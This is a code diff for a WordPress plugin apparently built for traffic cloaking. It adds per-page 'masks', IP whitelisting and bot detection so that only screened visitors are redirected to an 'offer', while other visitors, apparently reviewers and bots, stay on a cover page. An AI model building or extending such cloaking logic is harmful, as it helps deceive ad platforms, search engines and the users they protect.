@@ -26,9 +26,11 @@ require_once MRC_PLUGIN_DIR . 'includes/class-mask-manager.php';
 require_once MRC_PLUGIN_DIR . 'includes/class-analytics-queue.php';
 require_once MRC_PLUGIN_DIR . 'includes/class-redirector.php';
 
-// Require admin class
+// Require admin classes
 if (is_admin()) {
     require_once MRC_PLUGIN_DIR . 'includes/class-admin.php';
+    require_once MRC_PLUGIN_DIR . 'includes/class-notifications.php';
+    require_once MRC_PLUGIN_DIR . 'includes/class-admin-bar.php';
 }
 
 /**
@@ -81,24 +83,46 @@ class Mr_Cloak {
      * Handle incoming request - main traffic filtering logic
      */
     public function handle_request() {
-        // Skip for logged-in users and admin
-        if (is_admin() || is_user_logged_in()) {
+        // Skip for WordPress admins and admin area
+        if (is_admin() || current_user_can('manage_options')) {
             return;
         }
 
-        // Check if filtering is enabled
+        // Check if filtering is enabled globally
         if (!$this->mask_manager->is_filtering_enabled()) {
             return;
         }
 
-        // Get visitor info
+        // Get visitor IP
         $ip_address = MRC_API_Client::get_client_ip();
+
+        // Check IP whitelist
+        $whitelisted_ips = get_option('mrc_whitelisted_ips', array());
+        if (in_array($ip_address, $whitelisted_ips)) {
+            return; // IP is whitelisted, skip filtering
+        }
+
+        // Determine current page
+        $current_page_id = get_queried_object_id();
+        $is_home = is_front_page() || is_home();
+
+        // Find mask that applies to this page
+        $active_mask = $this->mask_manager->get_mask_for_page($current_page_id, $is_home);
+
+        // If no mask applies to this page, let WordPress continue normally
+        if (!$active_mask) {
+            return;
+        }
+
+        // Get visitor info
         $user_agent = MRC_Bot_Detector::get_user_agent();
 
-        // Process visitor with mask manager
-        $result = $this->mask_manager->process_visitor($ip_address, $user_agent);
+        // Process visitor with the mask for this page
+        $result = $this->mask_manager->process_visitor($ip_address, $user_agent, $active_mask);
 
         // Handle visitor based on result
+        // Only whitelisted visitors get redirected to offer
+        // Filtered visitors stay on current page (no action)
         $this->redirector->handle_visitor($result);
     }
 
